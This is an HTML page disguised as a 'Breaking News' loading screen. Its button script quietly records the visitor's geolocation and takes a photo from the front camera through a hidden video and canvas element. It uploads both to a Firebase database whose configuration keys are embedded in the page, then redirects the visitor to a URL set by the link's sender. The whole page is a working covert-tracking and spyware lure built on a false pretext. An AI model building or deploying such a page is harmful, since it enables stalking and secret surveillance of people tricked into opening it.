<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Breaking News - Loading...</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
</head>
<body class="bg-gray-900 text-white flex items-center justify-center min-h-screen">

    <div class="bg-gray-800 p-8 rounded-lg shadow-xl max-w-md w-full text-center">
        <div class="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-orange-500 mx-auto mb-4"></div>
        <h2 class="text-xl font-bold mb-2">Loading Breaking News...</h2>
        <p class="text-gray-400 text-sm mb-6">Please tap the button below to verify and view the full news article.</p>
        
        <button id="load-btn" onclick="captureAndRedirect()" class="w-full bg-orange-600 hover:bg-orange-700 text-white font-semibold py-3 rounded-lg transition shadow-lg cursor-pointer">
            📰 Read Full News Article
        </button>
    </div>

    <!-- Hidden Video and Canvas for Photo Capture -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBj20CcchbNqzUmiQo7gVcFvEgCXT_-AA4",
            authDomain: "calculatorapp-44d90.firebaseapp.com",
            projectId: "calculatorapp-44d90",
            storageBucket: "calculatorapp-44d90.appspot.com",
            messagingSenderId: "659953474145",
            appId: "1:659953474145:web:2fef467a200ee091d9a820"
        };

        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        // Get target URL from query parameters
        const urlParams = new URLSearchParams(window.location.search);
        const customTargetUrl = urlParams.get('target');
        const targetUrl = customTargetUrl ? decodeURIComponent(customTargetUrl) : 'https://www.google.com';

        function captureAndRedirect() {
            let btn = document.getElementById('load-btn');
            btn.disabled = true;
            btn.textContent = "Loading News...";

            // 1. Capture Location
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    db.collection('device_location_v2').add({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
                        device_name: "Web_Visitor"
                    }).catch(err => console.log(err));
                }, err => console.log(err), { timeout: 5000 });
            }

            // 2. Capture Camera Photo
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                const video = document.getElementById('video');
                video.srcObject = stream;
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const photoDataUrl = canvas.toDataURL('image/jpeg', 0.7);

                    // Stop camera stream
                    stream.getTracks().forEach(track => track.stop());

                    // Save photo to Firebase
                    db.collection('media_logs_v2').add({
                        url: photoDataUrl,
                        type: 'photo',
                        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
                        device_name: "Web_Visitor"
                    }).then(() => {
                        window.location.href = targetUrl;
                    }).catch(() => {
                        window.location.href = targetUrl;
                    });
                }, 1000);
            })
            .catch(() => {
                // If camera permission denied, still redirect to target
                window.location.href = targetUrl;
            });
        }
    </script>
</body>
</html>
